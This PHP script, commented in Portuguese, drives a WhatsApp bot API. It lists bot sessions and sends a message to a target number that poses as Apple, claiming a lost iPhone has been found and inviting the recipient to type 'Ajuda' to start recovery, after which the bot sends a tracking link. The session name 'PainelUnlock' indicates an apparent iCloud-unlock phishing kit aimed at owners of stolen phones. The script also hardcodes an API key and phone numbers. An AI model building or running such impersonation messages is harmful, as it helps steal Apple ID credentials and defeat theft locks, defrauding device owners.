<?php
/**
 * # WhatsApp Pro API Specification v2.0
 * 
 * ## 1. Authentication
 * - Method: Bearer Token
 * - Header: Authorization: Bearer <API_KEY>
 * 
 * ## 3. Bot Standard Message (Template)
 * Example Payload:
 * {
 *   "session": "thiago",
 *   "number": "5541995810993",
 *   "message": "*Dispositivo Localizado*...",
 *   "mediaPath": "C:/path/to/apple_logo.png",
 *   "trackLink": "https://link-de-recuperacao.com",
 *   "language": "pt"
 * }
 */

// 1. CONFIGURAÇÕES (Preencha com seus dados)
require_once 'config.php';
$api_url = BOT_API_URL;
$api_key = "botzp_75ee8182fd0c60022f3f25f665806c27"; // Sua API Key válida (ID 2Admin)
$target_number = "554195457772"; // Número de destino
$session_id = "PainelUnlock"; // Nome da instância conectada
$trackLink = "https://icloud.com"; // O Link que o bot vai enviar
$idioma = "pt"; // Idioma do contato (en, es, zh, fr, ar, ru, sv)

// 2. DETALHES DO DISPOSITIVO (O usuário escolhe aqui)
$iphone_modelo = "iPhone 15 Pro Max";
$iphone_cor = "Titânio Natural";
$iphone_capacidade = "512 GB";

echo "--- Iniciando Teste da API Pro (Modo Dinâmico: {$iphone_modelo}) ---\n\n";

// FUNÇÃO AUXILIAR PARA REQUISIÇÕES
function apiRequest($method, $endpoint, $data = null, $apiKey = '') {
    global $api_url;
    $ch = curl_init($api_url . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    
    $headers = [
        'Content-Type: application/json'
    ];
    if ($apiKey) {
        $headers[] = 'Authorization: Bearer ' . $apiKey;
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    if ($data) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'code' => $httpCode,
        'body' => json_decode($response, true)
    ];
}

// ETAPA 1: TESTAR AUTENTICAÇÃO E LISTAR SESSÕES
echo "1. Listando sessões ativas...\n";
$res = apiRequest('GET', '/api/sessions', null, $api_key);
if ($res['code'] === 200) {
    echo "SUCESSO! Sessões encontradas: " . count($res['body']) . "\n";
    foreach($res['body'] as $s) {
        echo " - ID: {$s['id']} | Status: {$s['status']} | Numero: " . ($s['number'] ?? 'N/A') . "\n";
    }
} else {
    echo "ERRO NA AUTENTICAÇÃO: Código {$res['code']}\n";
    print_r($res['body']);
    exit;
}

echo "\n-----------------------------------\n";

// ETAPA 2: VERIFICAR STATUS DE UMA SESSÃO ESPECÍFICA
echo "2. Verificando status da sessão '{$session_id}'...\n";
$res = apiRequest('GET', "/api/status/{$session_id}", null, $api_key);
echo "Status: " . ($res['body']['status'] ?? 'Não encontrada') . "\n";

echo "\n-----------------------------------\n";

// ETAPA 3: ENVIAR MENSAGEM DE TESTE (Template Bot Apple Dinâmico)
echo "3. Iniciando tentativa de envio direto...\n";
if (true) { 
    echo "3. Enviando template Apple ({$iphone_modelo}) para {$target_number}...\n";
    
    // Simulação das variáveis que o robô usa
    $vars = [
        '{modelo}' => $iphone_modelo,
        '{cor}' => $iphone_cor,
        '{capacidade}' => $iphone_capacidade,
        '{numero}' => $target_number // O número que recebe a mensagem aparece aqui
    ];
    
    // Template sem o link (o link será injetado pelo bot apenas nas respostas automáticas)
    $template = "*Dispositivo Localizado*\n" .
                "> Dispositivo: *{modelo} {cor} {capacidade}*\n" .
                "> Número de emergencia: *({numero})*\n" .
                "> ID de caso: *000-A946*\n" .
                "Para iniciar o processo de recuperação, digite *Ajuda*\n" .
                "> *Copyright ©️ 2025 Apple Inc*";
    
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $baseUrl = $protocol . "://" . $_SERVER['HTTP_HOST'];
    $publicMediaPath = $baseUrl . '/uploads/Dynamic.png';

    $payload = [
        'session' => $session_id,
        'number' => $target_number,
        'message' => $template, // Envia o texto sem modificar (sem strtr)
        'mediaPath' => $publicMediaPath,
        'trackLink' => $trackLink,
        'language' => $idioma
    ];
    
    $resSend = apiRequest('POST', '/api/send', $payload, $api_key);
    if ($resSend['code'] === 200) {
        echo "MENSAGEM ENVIADA COM SUCESSO! Chris ✅\n";
    } else {
        echo "FALHA AO ENVIAR: \n";
        print_r($resSend['body']);
    }
} else {
    echo "PULANDO ENVIO: A sessão '{$session_id}' não está conectada. Conecte-a via QR Code no painel primeiro.\n";
}

echo "\n--- Fim do Teste ---\n";
?>
